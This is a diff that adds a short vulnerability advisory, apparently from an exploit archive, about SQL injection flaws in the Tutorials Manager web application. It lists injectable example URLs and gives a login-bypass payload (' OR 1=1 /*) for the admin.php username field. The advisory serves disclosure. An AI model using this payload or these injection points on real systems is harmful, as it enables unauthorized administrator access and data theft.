@@ -1,0 +1,13 @@
+source: http://www.securityfocus.com/bid/10314/info
+
+Reportedly Tutorials Manager is affected by multiple SQL injection vulnerabilities. These issues are due to a failure of the application to properly sanitize user-supplied input.
+
+These SQL injection issues might allow a remote attacker to manipulate query logic, potentially leading to unauthorized access to sensitive information such as the administrator password hash or corruption of database data. SQL injection attacks may also potentially be used to exploit latent vulnerabilities in the underlying database implementation.
+
+http://www.example.com/guides/index.php?lang=0&CODE=02&id=1[SQL]
+http://www.example.com/guides/index.php?lang=0&CODE=01&id=1[SQL]
+http://www.example.com/guides/index.php?lang=0&CODE=14&id=1[SQL]
+http://www.example.com/guides/admin.php?s=[SOMETHING]&act=own
+http://www.example.com/sites/guides/admin.php?s=[SOMETHING]&act=admin&CODE=01
+
+Passing the input ' OR 1=1 /* through the 'username' filed of the 'admin.php' script is reported to grant unauthorized administrator access to the affected application.
